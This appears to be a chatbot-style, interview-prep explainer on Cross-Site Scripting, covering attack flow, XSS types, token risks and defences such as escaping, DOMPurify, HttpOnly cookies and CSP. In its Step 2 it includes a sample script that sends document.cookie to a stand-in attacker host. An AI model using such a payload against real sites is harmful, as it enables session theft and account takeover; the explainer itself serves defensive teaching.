Let’s do XSS (Cross-Site Scripting) in the same structured, interview-ready way 👇

⚡ What is Cross-Site Scripting?

👉 XSS is when an attacker injects malicious JavaScript into your app, and that script runs in other users’ browsers

🧠 Core Idea
Attacker injects script → App renders it → Browser executes it as trusted code

👉 Browser trusts it because it came from your domain

💥 Step-by-Step Attack Flow
🟢 Step 1: Your app takes user input
Comment box / search / profile name
🔴 Step 2: Attacker injects script
<script>
  fetch("https://attacker.com?cookie=" + document.cookie)
</script>
🟡 Step 3: App renders it without sanitizing
<div>USER INPUT HERE</div>

👉 Script gets executed ❌

😨 Step 4: Browser runs it
Runs inside your domain (trusted)
💀 Step 5: Data stolen
Cookies / tokens / session / user actions
🔥 Types of XSS
🟢 1. Stored XSS (Most dangerous)
Attacker input → stored in DB → shown to all users

👉 Affects everyone

🟡 2. Reflected XSS
Input → URL → reflected in response

👉 One-time attack via link

🔵 3. DOM-based XSS
Frontend JS directly manipulates DOM unsafely

👉 Happens in React/JS code

⚠️ Why XSS is Dangerous (Your Context)

With auth (like PingFederate):

🔴 If SPA (token in UI)
XSS → steal access_token → full account takeover 😨
🟢 If BFF (HttpOnly cookie)
XSS → cannot read cookie
BUT can still send requests as user ⚠️
❗ XSS vs CSRF (Important)
Attack	What it does
XSS	Runs malicious JS
CSRF	Sends fake request
🔐 How to Prevent XSS
✅ 1. Escape output (React helps)
<div>{userInput}</div>  // SAFE ✅
❌ Dangerous
<div dangerouslySetInnerHTML={{ __html: userInput }} />
✅ 2. Input sanitization
Remove <script>
Use libraries like DOMPurify
✅ 3. Use HttpOnly cookies
Cookie not accessible via JS

👉 Prevents token theft

✅ 4. Content Security Policy (CSP)
Block untrusted scripts
✅ 5. Avoid inline scripts
🔥 Real Attack Example (Interview Gold)
1. Attacker posts malicious comment
2. Stored in DB
3. Other user opens page
4. Script runs
5. Sends cookie/token to attacker
6. Attacker logs in as user
🧠 Mental Model
XSS = “Running attacker’s JS in your app”
🧾 Final Takeaway

👉
XSS allows attackers to inject and execute malicious JavaScript in a user’s browser, potentially stealing sensitive data or performing actions on behalf of the user.

🎯 Perfect Interview Answer

👉
“Cross-Site Scripting is a vulnerability where malicious JavaScript is injected into a web application and executed in the user’s browser, allowing attackers to steal session data, tokens, or perform actions on behalf of the user. It can be prevented using output escaping, input sanitization, and security headers like CSP.”

